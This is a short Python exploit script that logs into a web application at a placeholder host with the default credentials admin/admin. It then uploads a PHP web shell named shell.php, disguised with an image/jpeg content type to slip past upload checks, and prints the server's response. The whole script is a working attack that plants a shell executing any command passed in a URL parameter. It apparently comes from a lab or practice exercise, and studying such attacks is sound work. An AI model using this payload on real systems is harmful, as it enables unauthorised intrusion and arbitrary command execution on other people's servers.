import requests

s = requests.Session()
# Login first
s.post("http://target.com/login", data={"user":"admin","pass":"admin"})

# Upload
files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>', 'image/jpeg')}
r = s.post("http://target.com/upload", files=files)
print(r.text)